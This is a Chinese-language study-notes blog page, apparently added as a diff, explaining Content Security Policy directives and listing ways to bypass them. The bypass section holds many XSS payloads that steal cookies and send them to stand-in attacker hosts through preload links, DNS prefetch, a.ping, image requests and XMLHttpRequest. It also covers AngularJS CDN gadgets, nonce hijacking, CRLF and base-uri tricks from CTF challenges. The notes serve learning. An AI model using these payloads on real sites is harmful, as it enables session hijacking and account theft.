@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            CSP &amp; Bypass
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCSP%EF%BC%9F"><span class="toc-text">什么是CSP？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%AF%E6%8C%81CSP%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-text">支持CSP的浏览器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP%E7%9A%84%E6%9D%A5%E6%BA%90"><span class="toc-text">CSP的来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-text">CSP的属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#child-src"><span class="toc-text">child-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#connect-src"><span class="toc-text">connect-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#default-src"><span class="toc-text">default-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-src"><span class="toc-text">font-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img-src"><span class="toc-text">img-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#manifest-src"><span class="toc-text">manifest-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#media-src"><span class="toc-text">media-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#object-src"><span class="toc-text">object-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#script-src"><span class="toc-text">script-src</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#style-src"><span class="toc-text">style-src</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE"><span class="toc-text">数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xxx-src"><span class="toc-text">xxx-src *</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#script-src-unsafe-inline"><span class="toc-text">script-src unsafe-inline</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxx-src-self"><span class="toc-text">xxx-src self</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Iframe%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">Iframe包含导致的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF%E5%AF%BC%E8%87%B4%E7%9A%84bypass"><span class="toc-text">CRLF导致的bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Base-uri%E7%BB%95%E8%BF%87"><span class="toc-text">Base-uri绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN%E7%BB%95%E8%BF%87"><span class="toc-text">CDN绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%A5%E5%85%A8"><span class="toc-text">利用浏览器补全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E7%BB%95%E8%BF%87"><span class="toc-text">本地文件包含导致绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">CSP注入导致的绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-text">参考：</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>这部分是从其他师傅们的文章里摘抄的笔记与一些其他内容的总结，以便学习与复习。</p>
+<h2 id="什么是CSP？"><a href="#什么是CSP？" class="headerlink" title="什么是CSP？"></a>什么是CSP？</h2><p>Content Security Policy （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。</p>
+<p><a target="_blank" rel="noopener" href="https://www.w3.org/TR/CSP3/#directive-font-src">https://www.w3.org/TR/CSP3/</a></p>
+<a id="more"></a>
+
+<h2 id="支持CSP的浏览器"><a href="#支持CSP的浏览器" class="headerlink" title="支持CSP的浏览器"></a>支持CSP的浏览器</h2><p>CSP主要有三个header，分别是：Content-Security-Policy，X-Content-Security-Policy，X-WebKit-CSP</p>
+<ul>
+<li>Content-Security-Policychrome 25+，Firefox 23+，Opera 19+</li>
+<li>X-Content-Security-PolicyFirefox 23+，IE10+</li>
+<li>X-WebKit-CSPChrome 25+</li>
+</ul>
+<h2 id="CSP的来源"><a href="#CSP的来源" class="headerlink" title="CSP的来源"></a>CSP的来源</h2><p>常见的CSP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy:default-src &#39;none&#39;; connect-src &#39;self&#39;; frame-src &#39;self&#39;; script-src xxxx&#x2F;js&#x2F; &#39;sha256-KcMxZjpVxhUhzZiwuZ82bc0vAhYbUJsxyCXODP5ulto&#x3D;&#39; &#39;sha256-u++5+hMvnsKeoBWohJxxO3U9yHQHZU+2damUA6wnikQ&#x3D;&#39; &#39;sha256-zArnh0kTjtEOVDnamfOrI8qSpoiZbXttc6LzqNno8MM&#x3D;&#39; &#39;sha256-3PB3EBmojhuJg8mStgxkyy3OEJYJ73ruOF7nRScYnxk&#x3D;&#39; &#39;sha256-bk9UfcsBy+DUFULLU6uX&#x2F;sJa0q7O7B8Aal2VVl43aDs&#x3D;&#39;;font-src xxxx&#x2F;fonts&#x2F; fonts.gstatic.com; style-src xxxx&#x2F;css&#x2F; fonts.googleapis.com; img-src &#39;self&#39;&quot;);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>none</code>代表什么都不匹配，self代表匹配同源的内容；</li>
+<li><code>https://example.com/path/to/file.js</code>这样的会匹配特殊的文件，<code>https://example.com/</code>这样会匹配源下的所有文件；</li>
+<li><code>https:</code>，会匹配所有包含这个特殊的格式的来源；</li>
+<li><code>example.com</code>会匹配所有这个host的来源，<code>*.example.com</code>,会匹配这个host的所有子域；</li>
+<li><code>nonce-qwertyu12345</code>会匹配一个特殊的节点。；</li>
+<li>还有加密过的类似于<code>sha256-abcd…</code>同样会匹配页面中一个特殊的节点（每次修改这个值都会改变）</li>
+</ol>
+<h2 id="CSP的属性"><a href="#CSP的属性" class="headerlink" title="CSP的属性"></a>CSP的属性</h2><h3 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h3><p><code>child-src</code>指令管理了套嵌浏览的部分（类似于iframe、frame标签）。</p>
+<h3 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h3><p><code>connect-src</code>指令限制了可使用的脚本加载的url，会阻止a的ping属性，也控制着websocket的连接。script标签里面的数据发送由这个属性限制。</p>
+<h3 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h3><p>属性的默认值，如果没有指定值，则默认为<code>default-src</code>所设定的值。</p>
+<h3 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h3><p><code>font-src</code>指令限制了所有可以被加载的字体资源。</p>
+<h3 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h3><p><code>img-src</code>指令限制着所有可以加载的图片资源的来源。</p>
+<h3 id="manifest-src"><a href="#manifest-src" class="headerlink" title="manifest-src"></a>manifest-src</h3><p><code>manifest-src</code>指令限制了从应用清单可以加载的url。常见的就是link标签</p>
+<p><code>&lt;link rel=&quot;manifest&quot; href=&quot;[https://not-example.com/manifest](https://not-example.com/manifest)&quot;&gt;</code></p>
+<h3 id="media-src"><a href="#media-src" class="headerlink" title="media-src"></a>media-src</h3><p><code>media-src</code>指令限制令额所有从视频、音频、和相关的文本来源。针对<code>audio</code> <code>video</code>以及连带的文本。</p>
+<h3 id="object-src"><a href="#object-src" class="headerlink" title="object-src"></a>object-src</h3><p><code>object-src</code>限制了所有从插件加载的来源。例如<code>embed</code>、<code>object</code>、<code>applet</code>等。</p>
+<h3 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h3><p>script-src指令限制了所有js脚本可以被执行的地方，不仅仅是包括通过链接方式加载的脚本url，同样包括所有内联脚本，甚至包括各种方式的引用。</p>
+<ul>
+<li>参数<code>unsafe-inline</code>：不会阻止内联脚本</li>
+<li>参数<code>unsafe-eval</code>：会允许下面的几个函数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">Function()</span><br><span class="line">setTimeout() with an initial argument which is not callable.</span><br><span class="line">setInterval() with an initial argument which is not callable.</span><br></pre></td></tr></table></figure>
+
+<h3 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h3><p>style-src指令限制了所有可能被引用的css，包括下面三种引用的css属性，style也有个<code>unsafe-inline</code>这个参数。</p>
+<ul>
+<li>通过<code>link</code>标签加载的css</li>
+<li><code>style</code>标签</li>
+<li>通过<code>@import</code>引入的样式表</li>
+<li>内联样式表 ：<code>style=&quot;font-size:10px;font-color:#ff0000&quot;</code></li>
+</ul>
+<h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><ul>
+<li><code>data:</code> 允许data:URI作为内容来源</li>
+<li><code>mediastream:</code> 允许mediastream: URI作为内容来源</li>
+</ul>
+<p><code>Content-Security-Policy: default-src &#39;self&#39;; img-src &#39;self&#39; data:; media-src mediastream:</code></p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="xxx-src"><a href="#xxx-src" class="headerlink" title="xxx-src *"></a>xxx-src *</h3><p>类似于src引用的方式 ⇒ CSRF</p>
+<h3 id="script-src-unsafe-inline"><a href="#script-src-unsafe-inline" class="headerlink" title="script-src unsafe-inline"></a>script-src unsafe-inline</h3><p>不能从外部引入，但是可以直接内嵌：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文章中有一个案例：一个聊天框系统，由于系统还设置了同源策略，不能将cookie发送到别的域下。但是可以同js调用发送消息的接口来获取别人的cookie。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;submit.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(_Ctent-type_,_applicati&#x2F;x-www-form-urlencoded_);</span><br><span class="line">xmlhttp.send(_to&#x3D;lorexxar&amp;&amp;message&#x3D;_+document.cookie);&lt;&#x2F;script&gt;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="xxx-src-self"><a href="#xxx-src-self" class="headerlink" title="xxx-src self"></a>xxx-src self</h3><p>只允许同源的url，但是link标签比较例外，在chrome当中还没有被CSP所限制。可以导致CSRF漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; herf&#x3D;&quot;xxxxxxx&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>预加载导致的绕过</li>
+</ul>
+<p>具体可以参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html">https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 预加载某个页面 --&gt;</span><br><span class="line">&lt;link rel&#x3D;&#39;prefetch&#39; href&#x3D;&#39;http:&#x2F;&#x2F;xxxx&#39;&gt;&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel&#x3D;&#39;prerender&#39; href&#x3D;&#39;http:&#x2F;&#x2F;xxxx&#39;&gt;&lt;!-- chrome --&gt;</span><br><span class="line">&lt;!-- 预加载某个图片 --&gt;</span><br><span class="line">&lt;link rel&#x3D;&#39;prefetch&#39; href&#x3D;&#39;http:&#x2F;&#x2F;xxxx&#x2F;x.jpg&#39;&gt;</span><br><span class="line">&lt;!-- DNS 预解析 --&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxxx&quot;&gt;</span><br><span class="line">&lt;!-- 特定文件类型预加载 --&gt;</span><br><span class="line">&lt;link rel&#x3D;&#39;preload&#39; href&#x3D;&#39;&#x2F;&#x2F;xxxxx&#x2F;xx.js&#39;&gt;&lt;!-- chrome --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>chrome还没对预加载进行处理，firefox有进行处理，prefetch已不可用，但是dns预解析还是能用的。</p>
+<p>在unsafe-inline的情況下，利用的payload如下：</p>
+<p>Chrome Http通道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var n0t &#x3D; document.createElement(&quot;link&quot;);n0t.setAttribute(&quot;rel&quot;, &quot;preload&quot;);n0t.setAttribute(&quot;href&quot;, &quot;&#x2F;&#x2F;ipipipip&#x2F;&quot;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)()));document.head.appendChild(n0t);</span><br></pre></td></tr></table></figure>
+
+<p>Firefox(dns通道)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dc &#x3D; document.cookie;dcl &#x3D; dc.split(&quot;;&quot;);n0 &#x3D; document.getElementsByTagName(&quot;HEAD&quot;)[0];for (var i&#x3D;0; i&lt;dcl.length;i++)&#123;console.log(dcl[i]);n0.innerHTML &#x3D; n0.innerHTML + &quot;&lt;link rel&#x3D;\&quot;preconnect\&quot; href&#x3D;\&quot;&#x2F;&#x2F;&quot; + escape(dcl[i].replace(&#x2F;\&#x2F;&#x2F;g, &quot;-&quot;)).replace(&#x2F;%&#x2F;g, &quot;_&quot;) + &#39;.&#39; + location.hostname.split(&quot;.&quot;).join(&quot;&quot;) +  &quot;.xxx.io\&quot;&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当资源类型是以下几种情况时，预加载操作不会执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">URL中包含下载资源</span><br><span class="line">页面中包含音频、视频</span><br><span class="line">POST、PUT和DELET操作的ajax请求</span><br><span class="line">HTTP认证</span><br><span class="line">HTTPS页面</span><br><span class="line">含恶意软件的页面</span><br><span class="line">弹窗页面</span><br><span class="line">占用资源很多的页面</span><br><span class="line">打开了chrome developer tools开发工具</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jQuery sourcemap</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write(&#96;&lt;script&gt;</span><br><span class="line">&#x2F;&#x2F;@ 	   sourceMappingURL&#x3D;http:&#x2F;&#x2F;xxxx&#x2F;&#96;+document.cookie+&#96;&lt;\&#x2F;script&gt;&#96;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>a标签的ping属性</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;document.createElement(&#39;a&#39;);</span><br><span class="line">a.href&#x3D;&#39;#&#39;;</span><br><span class="line">a.ping&#x3D;&#39;http:&#x2F;&#x2F;xxx.io&#x2F;?&#39; + escape(document.cookie);</span><br><span class="line">a.click();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>http 204</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location&#x3D;&#39;&#x2F;&#x2F;xxx.io&#x2F;csi?&#39; + escape(document.cookie);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>script包含的js进行绕过（通用的bypass方式）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.location&#x3D;&quot;http:&#x2F;&#x2F;www.xss.com&#x2F;x.php?c&#x3D;[cookie]&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;document.createElement(&quot;a&quot;);</span><br><span class="line">a.href&#x3D;&#39;http:&#x2F;&#x2F;www.xss.com&#x2F;?c&#x3D;&#39;+escape(document.cookie);</span><br><span class="line">a.click();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var i&#x3D;document.createElement(&quot;img&quot;);</span><br><span class="line">i.src&#x3D;&#39;http:&#x2F;&#x2F;www.xss.com&#x2F;?c&#x3D;&#39;+escape(document.cookie);</span><br><span class="line">xxx.appendChild(i);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>重定向(302)导致绕过</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;;script-src http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F; ;</span><br></pre></td></tr></table></figure>
+
+<p>如果能找到一个url跳转，通过<code>/a/</code>目录下跳转到其他目录下读取文件，即可绕过。</p>
+<ul>
+<li>文件上传导致的Bypass</li>
+</ul>
+<p>当上传的文件处于csp所规定的目录下时，apache和nginx会有不同的解析方式。</p>
+<p>apache：在一个未知后缀名并且不指定content-type的情况下，会默认以html解析。</p>
+<p>nginx：不指定后缀名的情况下，会直接写下载。可以尝试上传<code>&lt;svg&gt;</code>格式的xss payload。</p>
+<p><code>&lt;svg xmlns=&quot;[http://www.w3.org/2000/svg&amp;quot;](http://www.w3.org/2000/svg&amp;quot;) onload=&quot;alert(URL)&quot;/&gt;</code></p>
+<p>如果能够直接上传一个jpg图片，我们可以通过下面的payload进行调用：</p>
+<p><code>&lt;embed src=&quot;[http://127.0.0.1/upload/1.jpg](http://127.0.0.1/upload/1.jpg&amp;quot;)&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/embed&gt;</code></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/318/">https://xz.aliyun.com/t/318/</a></p>
+<h3 id="Iframe包含导致的绕过"><a href="#Iframe包含导致的绕过" class="headerlink" title="Iframe包含导致的绕过"></a>Iframe包含导致的绕过</h3><p>同源站点中，如果index.php没有作过滤，而csp.php有过滤的话，可以用index.php页面创建一个iframe，直接操作iframe的dom进行绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var iframe &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line">iframe.src&#x3D;&quot;.&#x2F;safe.php&quot;;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">setTimeout(()&#x3D;&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;xxx&#x2F;cookie&#x2F;&#39;+escape(document.cookie),1000);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CRLF导致的bypass"><a href="#CRLF导致的bypass" class="headerlink" title="CRLF导致的bypass"></a>CRLF导致的bypass</h3><p>当通过CRLF传入%0d%0a%0d%0a，可以使HTTP头部中的csp规则变成网页内容而被忽视。(PHP高版本中不允许发送多行Header)</p>
+<p>HCTF2018_Bottle：<a target="_blank" rel="noopener" href="https://github.com/Lou00/HCTF2018_Bottle">https://github.com/Lou00/HCTF2018_Bottle</a></p>
+<h3 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a>Base-uri绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">default-src &#39;self&#39;; script-src &#39;nonce-test&#39;</span><br><span class="line"></span><br><span class="line">default没有额外设置base-uri</span><br></pre></td></tr></table></figure>
+
+<p>使用base标签将页面中的地址设置为自己的vps，script使用的相对路径，可以进行绕过利用。</p>
+<h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><p>当规则中包含了某一个CDN服务器，并且服务器上存在低版本的框架，则可以利用框架所存在的漏洞进行xss来绕过csp。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/855/">https://paper.seebug.org/855/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- foo&#x3D;&quot;--&gt;</span><br><span class="line">&lt;script src&#x3D;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;angular.js&#x2F;1.0.8&#x2F;angular.min.js&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&#39;alert(document.cookie)&#39;)()&#125;&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&#x2F;&#x2F;sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>存在低版本angular js的CDN服务商列表：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a></p>
+<p>其他的库：</p>
+<p>Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role&#x3D;popup id&#x3D;&#39;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
+<h3 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h3><p>有些网站限制只有某些脚本才能使用，往往会使用<code>&lt;script&gt;</code>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</span><br></pre></td></tr></table></figure>
+
+<p>那么当脚本插入点为如下的情况时:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script id&#x3D;&quot;aa&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以插入:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&#x2F;&#x2F;14.rs a&#x3D;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这样会拼成一个新的script标签，其中的src可以自由设定</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src&#x3D;&#x2F;&#x2F;14.rs a&#x3D;&quot;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script id&#x3D;&quot;aa&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地文件包含导致绕过"><a href="#本地文件包含导致绕过" class="headerlink" title="本地文件包含导致绕过"></a>本地文件包含导致绕过</h3><p>当csp都是self时，可以通过上传本地文件，然后进行包含。</p>
+<ul>
+<li>cctf 2016</li>
+</ul>
+<p>通过后台上传了一个swf。(但是这里我一直没有复现成功，可能是浏览器版本的缘故。)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CWS</span><br><span class="line">&lt;script&gt;var xml &#x3D; new XMLHttpRequest(); xml.open(&#39;POST&#39;, &#39;http:&#x2F;&#x2F;xss.xxxxx.cc&#39;, true); xml.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;); xml.send(&#39;cookie&#x3D;&#39;+document.cookie); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&#39;import&#39; href&#x3D;&#39;&#x2F;upload&#x2F;xxxxx&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>hctf 2016：</p>
+<p>题目csp限制只能在static加载js，把文件上传到upload目录，通过%2f跨目录加载。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src&#x3D;&quot;http:&#x2F;&#x2F;sguestbook.hctf.io&#x2F;static&#x2F;..%2fupload&#x2F;a32642750cae25f4c5b020d9a66c5c5c&quot;&gt;&lt;&#x2F;scscriptript&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSP注入导致的绕过"><a href="#CSP注入导致的绕过" class="headerlink" title="CSP注入导致的绕过"></a>CSP注入导致的绕过</h3><p>当CSP中的内容是可控的内容时，可以通过下面两种方式绕过：</p>
+<ul>
+<li>破坏CSP的方法（Edge浏览器）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSP: script-src &#39;none&#39;; report-uri &#x2F;test;_</span><br></pre></td></tr></table></figure>
